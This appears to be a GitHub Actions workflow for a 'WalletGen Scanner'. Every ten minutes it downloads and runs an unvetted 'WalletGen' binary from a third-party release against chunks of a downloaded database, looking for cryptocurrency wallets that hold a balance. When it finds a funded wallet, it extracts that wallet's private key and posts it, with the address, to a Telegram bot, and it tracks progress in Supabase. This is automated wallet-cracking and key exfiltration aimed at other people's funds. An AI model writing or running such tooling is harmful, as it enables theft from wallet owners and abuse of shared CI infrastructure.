name: WalletGen Scanner

on:
  workflow_dispatch:        # manual trigger
  schedule:
    - cron: "*/10 * * * *"  # run every 10 minutes

jobs:
  run-checker:
    runs-on: ubuntu-latest
    steps:
      - name: Install expect
        run: |
          sudo apt-get update
          sudo apt-get install -y expect jq curl

      - name: Download release + database file
        run: |
          wget https://github.com/wizdomf3lix/seed-phrase-generator/releases/download/v5%2C0/WalletGen_linux_x64.5.0-linux.tar.gz
          tar -xzf WalletGen_linux_x64.5.0-linux.tar.gz
          # Download database file
          curl -L https://raw.githubusercontent.com/mnadamod/walletgens/main/evm_database.txt -o walletgen/evm_database.txt

      - name: Verify database file
        run: |
          echo "=== Verifying database file ==="
          ls -lh walletgen/evm_database.txt || true
          head -n 5 walletgen/evm_database.txt || true
          wc -l walletgen/evm_database.txt || true

      - name: Get last index from Supabase
        id: index
        run: |
          last=$(curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/progress?select=last_index" \
            -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" | jq -r '.[0].last_index')
          if [ "$last" = "null" ] || [ -z "$last" ]; then
            last=1
          fi
          echo "last_index=$last" >> $GITHUB_OUTPUT

      - name: Prepare chunk of database
        run: |
          total=$(wc -l < walletgen/evm_database.txt)
          if [ "$total" -eq 0 ]; then
            echo "Database file is empty, aborting run."
            exit 1
          fi
          start=${{ steps.index.outputs.last_index }}
          chunk_size=100000
          echo "Preparing chunk starting at line $start, size $chunk_size (total $total)"
          tail -n +"$start" walletgen/evm_database.txt | head -n "$chunk_size" > walletgen/evm_chunk.txt
          echo "Chunk prepared with $(wc -l < walletgen/evm_chunk.txt) lines"

      - name: Run checker with expect on chunk
        working-directory: walletgen
        run: |
          chmod +x walletgen
          echo "=== Starting walletgen with expect ==="
          # Run WalletGen interactively with expect, suppressing log flood
          expect <<'EOF' > result.txt
          log_user 0
          spawn ./walletgen
          expect {
            "select an action using the key:" { send "6\r" }
          }
          expect {
            "Enter database filename:" { send "evm_chunk.txt\r" }
          }
          expect {
            "Press ENTER to start checking:" { send "\r" }
          }
          expect eof
          EOF
          code=$?
          echo "=== walletgen exit code: $code ==="
          # Ensure result.txt exists even if empty
          touch result.txt
          echo "=== WalletGen finished, final line count: $(wc -l < result.txt) ==="
          # Show only the first 50 lines to avoid overwhelming logs
          head -n 50 result.txt

      - name: Process results and update Supabase
        id: process
        working-directory: walletgen
        run: |
          found=false
          active_addr=""
          active_priv=""

          if [ ! -s result.txt ]; then
            echo "No results generated, skipping Supabase update"
          else
            while read -r line; do
              if [[ $line == address* ]]; then
                addr=$(echo "$line" | awk '{print $2}')
              fi
              if [[ $line == balance* ]]; then
                bal=$(echo "$line" | awk '{print $2}')
                status="empty"
                if [[ "$bal" != "(empty)" && "$bal" != "0.000000$" ]]; then
                  status="active"
                fi

                # Check Supabase for duplicates
                exists=$(curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets?address=eq.${addr}" \
                  -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}")

                if [ "$exists" = "[]" ]; then
                  # Insert new wallet with status
                  curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets" \
                    -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" \
                    -H "Content-Type: application/json" \
                    -d "{\"address\":\"$addr\",\"status\":\"$status\"}"
                fi

                if [ "$status" = "active" ]; then
                  found=true
                  active_addr=$addr
                  active_priv=$(grep "Private Key:" result.txt | head -n1 | awk '{print $3}')
                fi
              fi
            done < result.txt
          fi

          echo "found=$found" >> $GITHUB_OUTPUT
          echo "address=$active_addr" >> $GITHUB_OUTPUT
          echo "private=$active_priv" >> $GITHUB_OUTPUT

      - name: Update progress index
        run: |
          new_index=$(( ${{ steps.index.outputs.last_index }} + 100000 ))
          curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/progress" \
            -H "apikey: ${{ secrets.SUPABASE_KEY }}" -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" \
            -H "Content-Type: application/json" \
            -d "{\"id\":1,\"last_index\":$new_index}" \
            -X PATCH

      - name: Notify Telegram
        if: steps.process.outputs.found == 'true'
        run: |
          curl -s -X POST https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage \
          -d chat_id=${{ secrets.TELEGRAM_CHAT_ID }} \
          -d text="ðŸš¨ Active wallet found!\nAddress: ${{ steps.process.outputs.address }}\nPrivate Key: ${{ steps.process.outputs.private }}"

      - name: Debug Supabase table
        run: |
          echo "=== Current Supabase checked_wallets table ==="
          curl -s "${{ secrets.SUPABASE_URL }}/rest/v1/checked_wallets" \
            -H "apikey: ${{ secrets.SUPABASE_KEY }}" \
            -H "Authorization: Bearer ${{ secrets.SUPABASE_KEY }}" | jq .
